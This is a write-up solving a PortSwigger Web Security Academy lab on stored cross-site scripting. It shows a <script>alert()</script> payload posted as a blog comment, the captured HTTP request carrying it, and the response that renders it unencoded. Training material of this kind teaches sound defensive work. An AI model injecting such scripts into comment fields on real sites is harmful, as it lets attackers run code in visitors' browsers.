---
title: >
  Solution to `Stored XSS into HTML context with nothing encoded`
---

The following is a solution to [Lab: Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded).

Navigate to a blog post.

Leave the following payload in the body of a comment:
`<script>alert("boop");</script>`

This step is demonstrated in the screenshot below.
![A screenshot of the comment box with the alert("boop") payload as the body of the comment](/wsa-labs/docs/assets/alert()-poc-4202023-1.png)

Post the comment. Doing so solves the lab.

To see the effects of the alert() function, click Back to blog. The alert box should appear. This is shown in the screenshot below.
![A screenshot of the alert box with the message "boop"](/wsa-labs/docs/assets/alert()-poc-4202023-2.png)

The HTTP request associated with the action of posting the comment is below, as pulled from the HTTP history section of the Proxy tab in Burp Suite. The URL-encoded JavaScript can be seen at the bottom of the request.

~~~
POST /post/comment HTTP/2
Host: 0a3a001b0379440182b5e235007a00ac.web-security-academy.net
Cookie: [redacted]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: https://0a3a001b0379440182b5e235007a00ac.web-security-academy.net
Referer: https://0a3a001b0379440182b5e235007a00ac.web-security-academy.net/post?postId=3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

csrf=t2mkGTOtphNJPCANub2fdi6DX3X5cyP5&postId=3&comment=%3Cscript%3Ealert%28%22boop%22%29%3C%2Fscript%3E&name=Jean-Luc+Picard&email=email%40email.com&website=http%3A%2F%2Fwww.email.com
~~~

A snippet of the HTTP response when one navigates back to the blog appears below.

~~~
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9494

<!DOCTYPE html>
<html>
...
<script>alert("boop")</script>
...
~~~